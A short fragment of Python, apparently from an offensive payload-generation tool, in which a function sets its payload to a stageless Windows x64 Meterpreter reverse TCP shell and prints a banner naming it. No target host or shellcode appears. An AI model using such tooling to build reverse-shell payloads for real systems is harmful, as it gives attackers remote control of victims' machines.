...
def Construction():
    ...
    RC_PAYLOAD = "windows/x64/meterpreter_reverse_tcp"

    print(core.amcolors.PURPLE + core.amcolors.PURPLE + "[STAGELESS] Payload x64 Meterpreter Reverse TCP" + core.amcolors.ENDC)
